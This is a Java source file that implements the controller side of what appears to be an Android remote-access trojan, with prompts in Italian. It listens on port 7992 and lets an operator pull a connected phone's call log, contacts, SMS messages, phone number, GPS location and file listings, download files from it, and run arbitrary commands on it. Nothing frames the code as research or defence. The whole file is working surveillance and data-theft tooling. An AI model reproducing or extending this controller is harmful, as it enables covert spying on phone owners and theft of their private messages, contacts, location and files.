import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;
import java.io.*;



public class Test {

    public static void main(String args[]) throws IOException {
        final int portNumber = 7992;
        System.out.println("Creating server socket on port " + portNumber);
        ServerSocket serverSocket = new ServerSocket(portNumber);
        while (true) {
            
    Socket socket = serverSocket.accept();

    System.out.println("Connection accepted: "+ socket);

    InputStreamReader isr = new InputStreamReader(socket.getInputStream());
    BufferedReader in = new BufferedReader(isr);

    OutputStreamWriter osw = new OutputStreamWriter(socket.getOutputStream());
    BufferedWriter bw = new BufferedWriter(osw);
    PrintWriter out = new PrintWriter(bw,true);
    

    BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
    String userInput;
    
    System.out.println("Comandi disponibili: ");
    System.out.println("lista_chiamate - contatti - sms - download - lista_file - esegui");
    System.out.println("versione - numero - posizione - exit");
    
    userInput = stdIn.readLine(); 
        
    
    out.println(userInput);
    
    if(userInput.equals("lista_chiamate")){
        while(true){
        String log = in.readLine();
        System.out.println(log);
        
        
        if(log.equals("end")){
        break; 
        }
   
    }
    }
    
    if(userInput.equals("contatti")){
        while(true){
        String contatto = in.readLine();
        System.out.println(contatto);
        
        try{
        if(contatto.equals("end")){
        break; 
        }
    }catch(Exception e){
    break;
    }
    }
    }
    
    if(userInput.equals("sms")){
        
        while(true){
        String sms = in.readLine();
        System.out.println(sms);
        
        
        if(sms.equals("end")){
        break; 
        }
    }
    }
    
    if(userInput.equals("download")){
         BufferedReader std1 = new BufferedReader(new InputStreamReader(System.in));
        System.out.println("Immetti percorso+file locale: ");
         String userInput3 = std1.readLine();
         
         BufferedReader std = new BufferedReader(new InputStreamReader(System.in));
        System.out.println("Immetti percorso+file: ");
         String userInput2 = std.readLine();
         out.println(userInput2);
        
         
         String foto = in.readLine();
         System.out.println(foto);
         if(foto.equals("invio")){
             DataInputStream input = new DataInputStream(socket.getInputStream());
             FileOutputStream fileOut = new FileOutputStream(userInput3);
        byte[] buf = new byte[Short.MAX_VALUE];
        int bytesSent;        
        while( (bytesSent = input.readShort()) != -1 ) {
            input.readFully(buf,0,bytesSent);
            fileOut.write(buf,0,bytesSent);
        }
        fileOut.close();

    }else if(foto.equals("end")){
    
    }
    }
    
    if(userInput.equals("lista_file")){
        BufferedReader std = new BufferedReader(new InputStreamReader(System.in));
        System.out.println("Immetti percorso: ");
         String userInput2 = std.readLine();
         out.println(userInput2);
         
         while(true){
        String foto = in.readLine();
        System.out.println(foto);
        if(foto.equals("end")){
        break; 
        }
    }
    }
    
    if(userInput.equals("esegui")){
         BufferedReader std = new BufferedReader(new InputStreamReader(System.in));
         System.out.println("Immetti comando: ");
         String userInput2 = std.readLine();
         out.println(userInput2);
         
         while(true){
             String cmd = in.readLine();
             System.out.println(cmd);
             if(cmd.equals("end")){
                    break; 
             }
    }
    }
    
    if(userInput.equals("versione")){
        String str = in.readLine();
        System.out.println(str);
    }
    
    
    if(userInput.equals("numero")){
        String str = in.readLine();
        System.out.println("Numero: "+str);
    }
    
    if(userInput.equals("posizione")){
        String lat = in.readLine();
        String lon = in.readLine();
        System.out.println("Latitudine: "+lat);
        System.out.println("Longitudine: "+lon);
    }
    
  
    if(userInput.equals("exit")){
        out.close();
        in.close();
        stdIn.close();
        socket.close();
        break;
    }

  out.close();
  in.close();
  stdIn.close();
  socket.close();
      

        }
    }
}
